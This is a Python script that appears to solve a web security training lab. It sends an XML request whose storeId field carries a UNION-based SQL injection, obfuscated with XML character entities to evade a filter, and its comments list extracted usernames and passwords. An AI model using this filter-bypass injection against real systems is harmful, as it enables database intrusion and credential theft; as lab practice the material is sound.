import requests

def xmlConvert(phrase):
    conversion = {
        # 'a': f"&#x{53-18};",
        # 'b': f"&#x{53-17};",
        # 'c': f"&#x{53-16};",
        # 'd': f"&#x{53-15};",
        # 'e': f"&#x{53-14};",
        # 'f': f"&#x{53-13};",
        # 'g': f"&#x{53-12};",
        # 'h': f"&#x{53-11};",
        # 'j': f"&#x{53-9};",
        # 'k': f"&#x{53-8};",
        # 'l': f"&#x{53-7};",
        # 'p': f"&#x{53-3};",
        # 'q': f"&#x{53-2};",
        's': f"&#x{53-0};",
        # 't': f"&#x{53+1};",
        'u': f"&#x{53+2};",
        # 'v': f"&#x{53+3};",
        # 'w': f"&#x{53+4};",
        # 'x': f"&#x{53+5};",
        # 'y': f"&#x{53+6};",
        # 'z': f"&#x{53+7};",
        "'": "&#39;",
        # "*": "&#42;",
        # '_': "&#95;",
        # '.': "&#46;",
        # '$': '&#36;'
    }
    output = ""
    for char in phrase:
        if char.lower() in conversion:
            output = output + conversion[char.lower()]
        else:
            output = output + char
    return output




# XML bypass
with requests.Session() as s:
    url = 'https://0aba00b80454b18cc0151a0f007b00a3.web-security-academy.net/product/stock'
    productID = "1"
    commandString = "1 UNION SELECT password FROM users"
    storeID = xmlConvert(commandString)
    print(xmlConvert(commandString))
    # commandString = "1 UNION SELECT password FROM users": 9gu9pmb8vubrjy37q9u9, wgd22wyx3v0e3nhzjj38, kloqzbcfo7kppehu21n3
    # commandString = "1 UNION SELECT username FROM users": carlos, administrator, weiner
    # commandString = "1 UnION SeLECT version()" also worked and identifed it as postgres sql
    # Query that actually gets a 1 to appear, has to be in quotes: "1 &#x55;nIoN &#x53;eLeCT &#39;1&#39;"
    # null select query that worked: "1 &#x55;nIoN &#x53;eLeCT n&#x55;ll"
    xmldata = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>{productID}</productId><storeId>{storeID}</storeId></stockCheck>'
    session = s.post(url, data = xmldata)
    print(session.text)
